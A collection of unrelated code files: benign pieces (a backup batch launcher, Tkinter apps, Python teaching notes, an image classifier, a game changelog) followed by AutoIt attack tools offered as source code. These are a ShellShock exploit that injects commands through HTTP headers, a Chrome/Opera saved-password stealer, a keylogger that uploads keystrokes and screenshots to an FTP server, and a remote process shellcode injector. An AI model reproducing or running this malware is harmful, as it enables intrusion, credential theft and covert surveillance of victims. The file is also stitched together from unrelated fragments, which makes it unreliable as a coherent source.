title: Silent_mode.bat
content:
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::: Launch AAA_Sync in Silent Mode, output to Logfile :::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::     -- output to Logfile Pending: rev 8.2+ --
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::


@echo off
  if not defined set vers=v8.12.39 20230610151321 by -JpE-
  set bats=C:\Users\%username%\Documents\AAA Sync2Laptop\Batch Files\BCS-Suite
  if not exist %bats% echo . & echo Folder not found! & echo . & pause & exit
  title Silent_mode.bat %vers% launched: %date% @ %time%
  goto choice
  ::: DOES ^ NOT START BELOW
  
  
                  :::::::[ HANDY! Reusable Function Routines ]:::::::

::: loop body for for-loop below
:loop
  set line1=%line1%%charsForPadding%
  exit /b %errorlevel%

:padder <intVar lengthOfStringRequired>
  for /l %%k in (1, 1, %~1) do ( call :loop
    if %errorlevel% gtr 1 echo errorlevel: %errorlevel% & goto choice
  )
  exit /b %errorlevel%

:sizeOfString <stringVar string1>
  set string1=%~1
  set sizer="%bats%\string_length.bat"
  if exist %sizer% call %sizer% actualSize2 string1
  if not exist %sizer% echo . & echo Can't find %sizer% & echo . & pause & echo .
  exit /b %errorlevel%

:intro
  set charsForPadding=*=
  set line1=
  set txt1= Introducing Silent Mode! %vers% 
  call :sizeOfString "%txt1%"
  set /a size1=((%actualSize2% + 5) / 2)
  ::: The division by two is for 2  ^^^ pad chars.
  call :padder %size1%
  echo . & echo . & VER & echo . & echo .
  echo %line1%*
  echo =*=%txt1%=*=
  echo %line1%*
  echo .
  exit /b %errorlevel%


                  :::::::[ PROGRAM MAIN ]:::::::
:choice
  call :intro
  set msg="Ready to Run Backups? (Y/n): "
  choice /c yn /n /t 30 /d y /m %msg%
  if %errorlevel% equ 2 goto return
  echo . & echo Proceeding... & echo .
  ::goto start
  
:: :start
  set AAA="%bats%\AAA-Sync.bat"
  if not exist %AAA% echo . & echo %AAA% not found! & echo . & goto errr1
  set filename1="%bats%\overrider3.txt"
  ::: Purely a runtime file ^ see usages implementing override1 in %AAA% @:restart and the override1 var thereafter.
  if exist %filename1% del /f /s /q %filename1%
  copy %sizer% %filename1%
  call %AAA%
  if exist %filename1% del /f /s /q %filename1%
  goto return

                    :::::::[ Error and Exit Routines ]:::::::
:errr1
  echo oopsie an error sent Flow here. Get on it!
  pause
  set txt=OMG It fn Werked! Error Detected Successfully.
  title %txt%
  set sender1="Silent_mode.bat"
  set error="%bats%\ErrorHandling.bat"
  if exist %error% call %error% :next txt,%sender%


:return
  REM echo . & echo .
  REM set msg="Review what happened? (y/N): "
  REM choice /c yn /n /t 120 /d n /m %msg%
  REM if %errorlevel% equ 1 echo . & pause & echo . & pause & echo . & goto return
  


:::  100%  -JpE-

title: Janela de Favoritos com edição e exclusão (Python)
content:
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import webbrowser
import csv
from bs4 import BeautifulSoup
import requests
from datetime import datetime

def cadastrar():
    url = url_entry.get()
    if url:
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Salvar os dados em um arquivo CSV
            with open('sites.csv', 'a', newline='', encoding='utf-8') as file:
                writer = csv.writer(file)
                writer.writerow([title, url, current_time])

            # Adicionar os dados na Treeview
            tree.insert('', 'end', values=(title, url, current_time))
        except:
            # Tratamento de erro caso não seja possível acessar a URL
            messagebox.showerror("Erro", "Erro ao acessar a URL.")
    else:
        messagebox.showerror("Erro", "Digite uma URL.")

def excluir():
    item = tree.selection()
    if item:
        confirm = messagebox.askyesno("Confirmação", "Deseja realmente excluir a URL selecionada?")
        if confirm:
            selected_item = tree.selection()[0]
            title = tree.item(selected_item)['values'][0]
            url = tree.item(selected_item)['values'][1]
            tree.delete(selected_item)
            messagebox.showinfo("Exclusão", "URL excluída com sucesso.")

            # Remover o registro do arquivo CSV
            remove_registro_csv(title, url)
    else:
        messagebox.showerror("Erro", "Selecione uma URL para excluir.")

def editar():
    item = tree.selection()
    if item:
        selected_item = tree.selection()[0]
        old_title = tree.item(selected_item)['values'][0]
        old_url = tree.item(selected_item)['values'][1]

        # Exibir janela de edição
        edit_window = tk.Toplevel()
        edit_window.title("Editar URL")

        # Centralizar a janela de edição
        edit_window.update_idletasks()
        edit_window_width = edit_window.winfo_width()
        edit_window_height = edit_window.winfo_height()
        edit_position_right = int(edit_window.winfo_screenwidth() / 2 - edit_window_width / 2)
        edit_position_down = int(edit_window.winfo_screenheight() / 2 - edit_window_height / 2)
        edit_window.geometry(f"+{edit_position_right}+{edit_position_down}")

        # Campos de edição
        title_label = tk.Label(edit_window, text="Título:")
        title_label.pack()
        title_entry = tk.Entry(edit_window, width=50)
        title_entry.insert(0, old_title)
        title_entry.pack()

        url_label = tk.Label(edit_window, text="URL:")
        url_label.pack()
        url_entry = tk.Entry(edit_window, width=50)
        url_entry.insert(0, old_url)
        url_entry.pack()

        # Função para salvar as alterações
        def salvar():
            new_title = title_entry.get()
            new_url = url_entry.get()

            if new_title and new_url:
                tree.item(selected_item, values=(new_title, new_url))
                edit_window.destroy()

                # Atualizar o registro no arquivo CSV
                atualizar_registro_csv(old_title, old_url, new_title, new_url)
            else:
                messagebox.showerror("Erro", "Preencha todos os campos.")

        # Botão de salvar
        salvar_button = tk.Button(edit_window, text="Salvar", command=salvar)
        salvar_button.pack()

    else:
        messagebox.showerror("Erro", "Selecione uma URL para editar.")

def remove_registro_csv(title, url):
    rows = []
    with open('sites.csv', 'r', encoding='utf-8') as file:
        reader = csv.reader(file)
        for row in reader:
            if row[0] != title or row[1] != url:
                rows.append(row)

    with open('sites.csv', 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerows(rows)

def atualizar_registro_csv(old_title, old_url, new_title, new_url):
    rows = []
    with open('sites.csv', 'r', encoding='utf-8') as file:
        reader = csv.reader(file)
        for row in reader:
            if row[0] == old_title and row[1] == old_url:
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                rows.append([new_title, new_url, current_time])
            else:
                rows.append(row)

    with open('sites.csv', 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerows(rows)

def open_url(event):
    item = tree.selection()[0]
    url = tree.item(item)['values'][1]
    webbrowser.open_new(url)

def carregar_dados():
    try:
        with open('sites.csv', 'r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                title = row[0]
                url = row[1]
                timestamp = row[2]
                timestamp_dt = datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S")
                timestamp_br = timestamp_dt.strftime("%d/%m/%Y %H:%M:%S")
                tree.insert('', 'end', values=(title, url, timestamp_br))
    except FileNotFoundError:
        messagebox.showerror("Erro", "Arquivo 'sites.csv' não encontrado.")

# Configuração da janela principal
root = tk.Tk()
root.title("Cadastro de Sites")
root.geometry("1280x800")

# Centralizar a janela principal
root.update_idletasks()
window_width = root.winfo_width()
window_height = root.winfo_height()
position_right = int(root.winfo_screenwidth() / 2 - window_width / 2)
position_down = int(root.winfo_screenheight() / 2 - window_height / 2)
root.geometry(f"+{position_right}+{position_down}")

# Configuração da Treeview
tree = ttk.Treeview(root, columns=("Title", "URL", "Data e Hora"), show="headings")
tree.heading("Title", text="Título")
tree.heading("URL", text="URL")
tree.heading("Data e Hora", text="Data e Hora")
tree.pack()

# Configuração da caixa de texto
url_entry = tk.Entry(root, width=50)
url_entry.pack(pady=10)
url_entry.bind("<Return>", lambda event: cadastrar())

# Configuração do botão cadastrar
cadastrar_button = tk.Button(root, text="Cadastrar", command=cadastrar)
cadastrar_button.pack()

# Configuração do botão excluir
excluir_button = tk.Button(root, text="Excluir", command=excluir)
excluir_button.pack()

# Configuração do botão editar
editar_button = tk.Button(root, text="Editar", command=editar)
editar_button.pack()

# Configuração do evento de duplo clique na Treeview
tree.bind("<Double-1>", open_url)

# Carregar os dados do arquivo CSV
carregar_dados()

root.mainloop()

title: webinar-python-input-patterns-2023-06-10
content:
# Webinar Input Patterns June 10 2023

# input() ALWAYS returns a string
# myInput = input() # that myInput var is definitely a str!

# but we might want to change it to something else...

# 1 Recast a numeric string into an int or float
# 2 Breaking up a long string into a list of smaller strings
# 3 Break up a string containing numeric chars into a list of
#       recast ints or floats
# 4 One value tells you how many times to call input()
# 5 We DON'T KNOW how many times to call input(), but we know
#       a sentinel value to stop


# 1 Recast a numeric string into an int or float
# looks a number...  5 so it's really "5"
# myInput = int(input())
# print(type(myInput))

# 2 Breaking up a long string into a list of smaller strings
# "Pat Silly Doe"
myInput = "Pat Silly Doe" # input()
strList = myInput.split()
# myInput = input().split()
print(strList)

# getting a series of numbers... 12 44 67 23
# 3 Break up a string containing numeric chars into a list of
#       recast ints or floats
myInput =  "31 333 2 78 92" # input()
strList = myInput.split()
print(strList)
numList = []
# for __ in __someContainer__
for num in strList:
    numList.append(int(num))
print(numList)

# 4 One value tells you HOW MANY TIMES to call input()
# 5 # so 5 more pieces of data coming in...
# 30.0
# 50.0
# 10.0
# 100.0
# 65.0


# numVals = int(input()) # get that first input
# floatList = []
#
# for num in range(numVals):
#     # get each next input, do your stuff
#     nextInput = float(input())
#     floatList.append(nextInput)
# print(floatList)

# 5 We DON'T KNOW how many times to call input(), but we know to stop on some SENTINEL VALUE
# this is a WHILE loop condition

# ask for the FIRST input()
# myInput = input()
# # THEN I can set up a while loop condition...
# while myInput != "-1": # pay attention to string vs int
#     print(f"I got this input: {myInput}")
#     myInput = input()
# print(f"I am done! I saw the sentinel value of {myInput}")

# Condition is never satisfied... comparing ints and strings
# myInput = int(input())
# while myInput != "-1":
#     print(myInput * 2)
#     myInput = int(input())
# print(f"I am done! I saw the sentinel value of {myInput}")

# multiple quit commands
# You can quit with "quit" or "done" or "d"
myInput = input()
quitCommands = ["quit", "done", "d"] # pro tip: put them in a list!
while not myInput in quitCommands:
    print(f"I received the command: {myInput}")
    myInput = input()
print("OK. Done!")

# refueling.py
from tkinter import Label, Entry, Tk


class Refueling:
    def __init__(self):
        self.fuel_form = Tk()
        self.fuel_form.title("Зареждане на гориво")
        screen_width = self.fuel_form.winfo_screenwidth()
        screen_height = self.fuel_form.winfo_screenheight()
        w, h = 800, 800
        print(f"{screen_width} x {screen_height}")
        self.fuel_form.geometry(f"{w}x{h}+{int(screen_width / 2 - w / 2)}+{int(screen_height / 2 - h / 2)}")
        self.screen_width = self.fuel_form.winfo_screenwidth()

    def form(self):
        Label(self.fuel_form, text="РВ9449АР ").grid(row=0, column=0)
        Label(self.fuel_form, text="Обем на резервоара: 60 л").grid(row=1, column=0)
        Label(self.fuel_form, text="Период - > Януари").grid(row=2, column=0)





if __name__ == "__main__":
    test = Refueling()
    test.form()

    test.fuel_form.mainloop()

import json
import numpy as np
import cv2
import onnxruntime
import urllib.request


model = "/child-adult-nonhuman.onnx"
class_names = ["adults", "children", "nonhuman"]


def predict_single_image(image_url):
    req = urllib.request.Request(image_url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req) as url:
        image_contents = url.read()

    arr = np.asarray(bytearray(image_contents), dtype=np.uint8)
    img = cv2.imdecode(arr, -1)

    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)

    resized_image = cv2.resize(img, (300, 300))
    image_for_prediction = resized_image.transpose(2, 0, 1)
    image_for_prediction = image_for_prediction.astype("float32") / 255.0
    image_for_prediction = image_for_prediction[np.newaxis, :]

    data = json.dumps({"data": image_for_prediction.tolist()})
    data = np.array(json.loads(data)["data"]).astype("float32")
    session = onnxruntime.InferenceSession(model, None)
    input_name = session.get_inputs()[0].name
    output_name = session.get_outputs()[0].name

    result = session.run([output_name], {input_name: data})
    prediction = int(np.argmax(np.array(result).squeeze(), axis=0))

    probabilities = np.exp(result) / np.sum(np.exp(result))
    score = np.max(probabilities)
    score = float(score)

    return {"predicted_class": class_names[prediction], "score": score}

local Center = gui.Left.Spinners.Center
local Center_2 = gui.Right.MusicBar_BG.Main.Bar.Spinnyz.Center
local OuterCircle1 = gui.Left.Spinners.OuterCircle1
local OuterCircle2 = gui.Left.Spinners.OuterCircle2
local OuterCircle1_2 = gui.Right.MusicBar_BG.Main.Bar.Spinnyz.OuterCircle1
local OuterCircle2_2 = gui.Right.MusicBar_BG.Main.Bar.Spinnyz.OuterCircle2
local Spin1 = gui.Left.Spinners.Spin1
local Spin2 = gui.Left.Spinners.Spin2
local Spin1_2 = gui.Right.MusicBar_BG.Main.Bar.Spinnyz.Spin1
local Spin2_2 = gui.Right.MusicBar_BG.Main.Bar.Spinnyz.Spin2

while wait() do
    OuterCircle1.Rotation = OuterCircle1.Rotation - 7.111
    OuterCircle2.Rotation = OuterCircle2.Rotation + 5.111
    Spin1.Rotation = Spin1.Rotation + 11.111
    Spin2.Rotation = Spin2.Rotation - 11.111	
    Center.Rotation = Center.Rotation + 4.123
    OuterCircle1_2.Rotation = OuterCircle1.Rotation
    OuterCircle2_2.Rotation = OuterCircle2.Rotation
    Center_2.Rotation = Center.Rotation
end

(defun complement (f)
  "Returns a function that reverses the boolean value of the given function."
  (lambda (&rest args)
    (not (apply f args))))

n = int(input())
a = list(map(int, input().split()))

# Create a list to store the minimum sum at each position
dp = [0] * n

# Base cases
dp[1] = (a[1] - a[0]) ** 2

# Calculate the minimum sum for each position
for i in range(2, n):
    dp[i] = min(dp[i-1] + (a[i] - a[i-1]) ** 2, dp[i-2] + 3 * (a[i] - a[i-2]) ** 2)

# Print the minimal sum
print(dp[n-1])

content:
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Alan Turing: matemático inglés

¿Existen funciones matemáticas que puedan ser computadas automáticamente?
SI: lo demostró matemáticamente. A ese artefacto hipotético lo denominó
computador o computadora.  NO TODA FUNCIÔN ES COMPUTABLE

 La màquina de Turing demuestra que "se pueden escribir instrucciones"
 para darle al computador -> demuestra la posibilidad del software y de
 los lenguajes de programación
 
 Turing demuestra que las funciones computables pueden ser descompuestas
 en 3 estructuras lògicas: 1 condicional (if )y 2 bucles: 1 definido (for) y otro
 indefinido (while)
 
 Los lenguajes de programación son Turing completos si pueden programar
 cualquier función computables
 
 El lenguaje de Bitcoin NO es Turing completo
 
 Los leng de propósito general son todos Turing completos. Python, C, C++, Java..
 
 Python SOLO tiene 3 estructuras lógicas if, for, while 

# condicional: if
 
# Script que pide una edad y devuelve si es mayor o no

edad = int(input("Ingrese su edad: "))

if edad >= 18:
    print("Es mayor de edad")
    print("Felicitaciones")
else:
    print("Aún es menor")
    print("Lástima...")
    
print("Chau")
     

# Script que pide un nro de mes y devuelve el cuatrimestre al cual pertenece

mes = int(input("Ingrese el mes: "))

if 1 <= mes <= 4:
    print("Primer cuatrimestre")

elif 5 <= mes <= 8:
    print("Segundo cuatrimestre")

elif 9 <= mes <= 12:
    print("Tercer cuatrimestre")
    
else:
    print("Error en el ingreso de mes")
"""     

# Script que pide una edad y devuelve condición frente al voto
# ejemplo: edad menor a 16 años: voto prohibido
# 16 cumplidos y menos de 18: optativo
# 18 cumplidos y menos de 70: voto obligatorio
# 70 o más: voto optativo

# RECUERDEN CAPTURAR LOS ERRORES (edad negativa o cero, no hay límite superior)
# con el ELSE

edad = int(input("Ingrese su edad: "))

if 0 < edad < 16:
    print("Voto prohibido")
    
elif 16 <= edad < 18 or edad > 70:
    print("Voto optativo")
    
elif 18 <= edad < 70:
    print("Voto obligatorio")
 
else:
    print("Error en el ingreso de la edad")

title: BWR - Changelog 10/06/23
content:
Back Scatter
~ Reverted prior updates to firing and reload speed
+ Replaced clip size penalty with +34% bonus
- Reverted 20% less accurate
Former version was not adequate at giving the weapon a defined niche. The intent with inverting the clip size is to give it more sustainability when poking at enemies and between fights on the flank. The accuracy penalty return is intended to keep the weapon better suited for its intended burst damage use.
 
Conniver's Kunai
~ Stats overhauled
+ On backstab: Gain 50% of your max health
- On backstab: your max health is reduced by -20 (minimum of 65)
- +25% cloak drain rate
~ Max health drain restored at 1/s
~ Healing provides overheal up to 210
This version attempts to make the Kunai simpler than the prior iteration. The amount healed is based on your own max HP, and with repeat stabs diminishes the reward as your max HP is reduced too. The intent with this is to make it less rewarding for a spy to tank damage through back-to-back stabs, making the initial reward more valuable. Additionally, having a constant downside in the cloak drain would also force you out of hiding more to make the health more valuable as well.
 
Warrior's Spirit
+ Added +50% increased melee attack range
While this weapon is intended to be used to close out kills faster, it comes up short due to heavy's speed. To help with this, especially without the steak being used, its melee range was improved.
 
Sun-On-A-Stick
+ HEAT mode can be activated while holstered
~ HEAT mode is be activated with SPECIAL ATTACK, instead of M2
This change ought to make it less cumbersome to use, less time wasted on switching weapons, with the visual effects around the scout still letting people know what's coming.

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# algunas funciones:
# print() imprime,   del()  borra una variable   type() devuelve el tipo de variable
# funciones de conversión; int() float() str()  bool()
# funcion input(): ingresa datos por teclado
"""
# Script que saluda a una persona
nombre = "Juan"

# concatenación con el operador +
print("Hola " + nombre)

# concatenacion con comas: agrega un espacio entre las cadenas
print("Hola", nombre)



# Script que le pide al usuario que ingrese su nombre y lo saluda
nombre = input("Por favor, ingrese su nombre: ")
print("Hola", nombre)

# Script que pide un nombre y una edad y lo saluda
nombre = input("Por favor, ingrese su nombre: ")
edad = input("Por favor, ingrese su edad: ")
print("Hola",nombre + ", tenes",edad,"años")

# Script que pide nombre y edad y bromea
# "Hola Juan, tenés 22 años de edad pero parecés de 44"
nombre = input("Por favor, ingrese su nombre: ")
edad = int(input("Por favor, ingrese su edad: "))

print("Hola",nombre + ", tenés",edad,"años de edad pero parecés de", edad*2) 

# Otra forma de imprimir
print(f"Hola {nombre}, tenés {edad} años de edad pero parecés de {edad*2}")

"""

# Script que pide un radio y devuele la superficie del círculo
radio = float(input("Ingrese el radio: "))
print(f"La superficie del círculo es {3.1416 * radio**2:.2f}")

title: Shell Shock Exploit - Source Code
content:
#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.8.1
 Author: Naker90

 Parametros:
  $sURL =>  URL de la pagina a explotar
  $sCommand =>  Comandos a enviar al sistema vulnerado

 Script Function:
	Automatiza la explotacion de la vulnerabilidad ShellShock (CVE-2014-6271)

 Basado en el codigo en Python de Claudio Viviani: http://www.homelab.it/wp-content/uploads/2014/09/gnu_b4sh_43_rci_v2.py_.txt

#ce ----------------------------------------------------------------------------

Func _ShellShock($sURL, $sCommand)

	;Creando los objetos con los que vamos a trabajar
	Local $oHTTP = ObjCreate('winhttp.winhttprequest.5.1')
	Local $oERROR = ObjEvent('AutoIt.Error', 'Error')

	;Comprobando que la pagina esta disponible
	$oHTTP.Open('GET', $sURL, False)
	$oHTTP.Send()
	Local $sResponse = $oHTTP.Status()

	if $sResponse = 200 then

		;Comprobando que la pagina es vulnerable
		$oHTTP.Open('POST', $sURL, False)
		$oHTTP.SetRequestHeader('Naker-Noventa', '() { :;}; echo ' & chr(34) & 'Shell: Shock' & chr(34))
		$oHTTP.send()

		Local $sResponseHeaders = $oHTTP.GetAllResponseHeaders()

		If StringInStr($sResponseHeaders, 'Shell') then


			;Explotando la vulnerabilidad
			Local $sHeaders = '() { :;}; /bin/bash -c ' & chr(34) & $sCommand & chr(34)

			$oHTTP.Open('POST', $sURL, False)
			$oHTTP.SetRequestHeader('User-Agent', $sHeaders)
			$oHTTP.send()

			MsgBox(64, 'OK', 'Comandos enviandos!')

		Else
			MsgBox(16, 'ERROR', 'El Sistema no es vulnerable!')
			exit
		EndIf

	EndIf

EndFunc

Func Error()
	Msgbox(16, 'ERROR', 'Ha ocurrido un error con la pagina especificada, compruebe la url y pruebe de nuevo')
EndFunc

title: Chrome Password Stealer - Source Code
content:
#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.8.1
 Author: Naker90 - 03/06/2015

 Script Function:
    Recupera las contraseñas guardadas en el navegador Chrome y Opera.

 Testeado en Windows 7 x64 con la ultima version de Opera.

 Ejemplo de retorno:
	Web: http://www.web.com
	User: Usuario
	Pass: Password

ATENCIÓN
    Necesaria la libreria SQLite3.dll

 Saludos ;)

#ce ----------------------------------------------------------------------------

 #include <SQLite.au3>
 #include <String.au3>

Func OperaPasswordRecovery()

	Const $OS = @OSVersion

	Local $Keypath
	If $OS = 'WIN_XP' then
		$Keypath = 'C:\Documents and Settings\' & @UserName & '\Application Data\Opera\Opera\Login Data'
	Else
		$Keypath = 'C:\Users\' & @UserName & '\AppData\Roaming\Opera Software\Opera Stable\Login Data'
	EndIf

	_SQLite_Startup(@ScriptDir & '\sqlite3.dll')
	_SQLite_Open($Keypath, $SQLITE_OPEN_READWRITE)

	Local $Result, $Rows, $Columns
	Local $GetTables = _SQLite_GetTable(-1, 'select origin_url, username_value, password_value from logins;', $Result, $Rows, $Columns)

	If $Rows <> 0 then

		Local $Return
		For $i = 4 to UBound($Result) - 1

			Local $URL = $Result[$i]
			Local $User = $Result[$i + 1]
			Local $Pass = $Result[$i + 2]

			Local $PassSize = BinaryLen($Pass)

			Local $DataStruct = DllStructCreate('byte[' & $PassSize & ']')
			DllStructSetData($DataStruct, 1, $Pass)

			Local $DataInBolbStruct = DllStructCreate('dword cbData;ptr pbData')
			DllStructSetData($DataInBolbStruct, 1, $PassSize)
			DllStructSetData($DataInBolbStruct, 2, DllStructGetPtr($DataStruct))

			Local $DataOutBolbStruct = DllStructCreate('dword cbData;ptr pbData')

			Local $DllOpen = DllOpen('Crypt32.dll')
			Local $CryptUnprotectData = DllCall($DllOpen, 'bool', 'CryptUnprotectData', _
												'struct*', $DataInBolbStruct, _
												'ptr*', 0, _
												'ptr', 0, _
												'ptr', 0, _
												'ptr', 0, _
												'dword', 0, _
												'struct*', $DataOutBolbStruct)

			If $CryptUnprotectData[0] = 0 then Return 0

			Local $PasswordStruct = DllStructCreate('byte[' & DllStructGetData($DataOutBolbStruct, 1) & ']', DllStructGetData($DataOutBolbStruct, 2))
			Local $Password = _HexToString(StringTrimLeft(DllStructGetData($PasswordStruct, 1), 2))

			$Return &= 'Web: ' & $URL & @CRLF & 'User: ' & $User & @CRLF & 'Pass: ' & $Password & @CRLF & @CRLF

			$i += 2

		Next

		Return $Return

	Else

		Return 0

	EndIf

EndFunc

title: NK90 Keylogger - Source Code
content:
#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.8.1
 Author: Naker90

 Script Function:
	Captura de pulsaciones de teclado por la API GetAsyncKeyState (Mayusculas, minusculas y numeros),
  captura de pantalla y envio del Log a travez de FTP (File Transfer Protocol)

 Parametros:
	$sMinute_Delay => Tiempo de espera entre envio de Logs
  $sServerIP => IP del servidor FTP
	$sPort => Puerto del Servidor FTP
	$sUsername => Nombre de usuario del servidor FTP
	$sPassword => Contraseña del usuario del servidor FTP

Ejemplo de uso:
	Keylogger_Function(10,'XXX.XXX.XXX.XXX', 21, 'Naker90', '123')

#ce ----------------------------------------------------------------------------

#include <FTPEx.au3>
#include <ScreenCapture.au3>

Func Keylogger_Function($sMinute_Delay, $sServerIP, $sPort, $sUsername, $sPassword)

	Local $sTimeInit = TimerInit()
	Local $sDelay = $sMinute_Delay * 60000
	Local $sAlphabet[48] = ['0x30', '0x31', '0x32', '0x33', '0x34', '0x35', '0x36', '0x37', '0x38', '0x39', '0x41', '0x42', '0x43', '0x44', '0x45', '0x46', '0x47', '0x48', _
			'0x49', '0x4A', '0x4B', '0x4C', '0x4D', '0x4E', '0x4F', '0x50', '0x51', '0x52', '0x53', '0x54', '0x55', '0x56', '0x57', '0x58', '0x59', '0x60', '0x20', '0x2E']

	While 1
		Local $sInput
		For $si = 0 To 47

			Local $sShift = DllCall('User32.dll', 'int', 'GetKeyState', 'long', 0x10)
			Local $sBlockMayus = DllCall('User32.dll', 'int', 'GetKeyState', 'long', 0x14)
			Local $sGetAsyncKeyState = DllCall('User32.dll', 'int', 'GetAsyncKeyState', 'int', $sAlphabet[$si])

			If $sGetAsyncKeyState[0] = -32767 Then
				If $sShift[0] <> 0 And 1 Or $sBlockMayus[0] <> 0 And 1 Then
					$sInput = $sInput & ChrW($sAlphabet[$si])
				Else
					$sInput = $sInput & StringLower(ChrW($sAlphabet[$si]))
				EndIf
			EndIf

		Next

		If TimerDiff($sTimeInit) >= $sDelay Then

			Local $sLog = FileOpen(@TempDir & '\Log.txt', 1)
			FileWrite($sLog, $sInput)
			FileClose($sLog)

			Local $sScreenShot = _ScreenCapture_Capture(@TempDir & '\Image.jpg')

			File_Transfer_Protocol($sServerIP, $sPort, $sUsername, $sPassword)

			FileDelete(@TempDir & '\Log.txt')
			FileDelete(@TempDir & '\Image.jpg')

			$sInput = ''

			$sTimeInit = TimerInit()
		EndIf

	WEnd

EndFunc

Func File_Transfer_Protocol($ServerIP, $Port, $Username, $Password)

	Local $Directory =  '\' & @MDAY & '-' & @MON & '-' & @YEAR & '_' & @HOUR & '-' & @MIN

	Local $Open = _FTP_Open('MyFTP Control')
	Local $Connect = _FTP_Connect($Open, $ServerIP, $Username, $Password, 0, $Port)
	_FTP_DirCreate($Connect, $Directory)
	_FTP_FilePut($Connect, @TempDir & '\Log.txt', $Directory & '\Log.txt')
	_FTP_FilePut($Connect, @TempDir & '\Image.jpg', $Directory & '\Image.jpg')
	_FTP_Close($Connect)

EndFunc

title: OP Code Injector - Source Code
content:
#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.8.1
 Author: Naker90

 Script Function:
	Opcodes Remote Injection Process

 Los OpCodes que estan en el ejemplo inyectan un mensaje en el proceso

 Testeado en W7 x64 bits

 Ejemplo de uso:
 _OpcodesRemoteInjectionProcess('Anotador Naker90.exe') => Inyecta los opcodes en el proceso Anotador Naker90.exe

#ce ----------------------------------------------------------------------------

Func _OpcodesRemoteInjectionProcess($sProcessName)

	;Constantes necesarias para las llamadas a las APIS
	Const $sProcessAccessRight = 0x1F0FFF
	Const $sVirtualAlocRight = 0x00001000
	Const $sPAGE_EXECUTE_READWRITE = 0x40

	;OPCODES
	Local $sOpCodes = "0xFC33D2B23064FF325A8B520C8B52148B722833C9B11833FF33C0AC3C617C022C20C1CF0D03F8E2F081FF5BBC4A6A8B5A108B1275DA8B533C03D3FF72348B527803D38B722003F333C941AD03C381384765745075F4" & _
			"817804726F634175EB8178086464726575E2498B722403F3668B0C4E8B721C03F38B148E03D35233FF576861727941684C696272684C6F61645453FFD2683332010166897C2402687573657254FFD0686F7841018BDF885C24036861676542684D6573735450FF54" & _
			"242C57685E2E5E218BDC57535357FFD068657373018BDF885C24036850726F63684578697454FF742440FF54244057FFD0C3"

	;Creamos la estructura para los OpCodes y la escribimos
	Local $sOPCodeStrut = DllStructCreate('Byte[' & BinaryLen($sOpCodes) & ']')
	DllStructSetData($sOPCodeStrut, 1, $sOpCodes)

	;Obtenemos el peso de la estructura
	Local $sSize = DllStructGetSize($sOPCodeStrut)

	;Obtenemos el PID del proceso a inyectar
	Local $sPID = ProcessExists($sProcessName)

	;Si el PID es 0 lanzamos un error y salimos
	If $sPID = 0 Then
		MsgBox(16, 'ERROR', '¡El proceso no se encuentra en ejecución!')
		Exit
	EndIf

	;Abrimos el proceso con OpenProcess
	Local $sOpenProcess = DllCall('Kernel32.dll', 'Handle', 'OpenProcess', 'Dword', $sProcessAccessRight, 'Bool', False, 'Dword', $sPID)
	If Not ($sOpenProcess[0]) Then
		MsgBox(16, 'ERROR', 'Hubo un error abriendo el proceso con OpenProcess!')
		Exit
	EndIf

	;Reservamos memoria para la estructura con VirtualAllocEX y la escribimos con WriteProcessMemory
	Local $sVirtualAloc = DllCall('Kernel32.dll', 'Ptr', 'VirtualAllocEx', 'Handle', $sOpenProcess[0], 'Ptr', 0, 'Ulong_Ptr', $sSize, 'Dword', $sVirtualAlocRight, 'Dword', $sPAGE_EXECUTE_READWRITE)
	If Not ($sVirtualAloc[0]) Then
		MsgBox(16, 'ERROR', 'Hubo un error reservando memoria para la estructura!')
		Exit
	EndIf
	Local $sWriteStruct = DllCall('Kernel32.dll', 'Int', 'WriteProcessMemory', 'Handle', $sOpenProcess[0], 'Ptr', $sVirtualAloc[0], 'Ptr', DllStructGetPtr($sOPCodeStrut), 'ULong_Ptr', $sSize, 'Ulong_Ptr', 0)
	If $sWriteStruct = 0 Then
		MsgBox(16, 'ERROR', 'Hubo un error escribiendo la estructura en memoria!')
		Exit
	EndIf

	;Lanzamos el hilo remoto con CreateRemoteThread y esperamos con un WaitSingleObject
	Local $sRemoteThread = DllCall('Kernel32.dll', 'Handle', 'CreateRemoteThread', 'Handle', $sOpenProcess[0], 'Ptr', 0, 'Ulong_Ptr', 0, 'Ptr', $sVirtualAloc[0], 'Ptr', 0, 'Dword', 0, 'Dword', 0)
	If Not ($sRemoteThread[0]) Then
		MsgBox(16, 'ERROR', 'Hubo un error lanzando el hilo!')
		Exit
	EndIf
	Local $sWait = DllCall('Kernel32.dll', 'ptr', 'WaitForSingleObject', 'handle', $sRemoteThread[0], 'dword', 0x7FFFFFFF)

	;Cerramos el handle del OpenProcess
	Local $sCloseOpen = DllCall('Kernel32.dll', 'Int', 'CloseHandle', 'Handle', $sOpenProcess[0])
	If $sCloseOpen = 0 Then
		MsgBox(16, 'ERROR', 'Hubo un error cerrando el handle del proceso!')
		Exit
	EndIf

EndFunc   ;==>_OpcodesRemoteInjectionProcess
